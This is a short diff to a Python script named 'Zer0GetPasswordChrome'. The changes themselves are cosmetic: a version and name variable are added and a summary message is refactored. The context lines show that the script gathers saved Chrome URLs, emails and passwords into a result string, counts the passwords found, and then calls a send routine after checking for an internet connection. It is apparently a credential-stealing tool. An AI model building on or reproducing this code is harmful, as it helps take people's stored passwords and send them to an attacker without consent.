@@ -13,6 +13,10 @@ except:
     exit(1)
 
 
+version = "1.0"
+
+name = "Zer0GetPasswordChrome"
+
 # waiting time to verify internet connection
 DELAY_SLEEP_INTERNET = 60
 
@@ -108,7 +112,7 @@ class ChromePass:
 
 			self.result += "{} ({},{})\n".format(log[0], email, password)
 
-		self.result += "\nZer0GetPasswordChrome done: {} urls ({} passwords found) found".format(self.urlFind, passwordFind)
+		self.result += "\n" + name + " done: {} urls ({} passwords found) found".format(self.urlFind, passwordFind)
 
 		self.send()
 
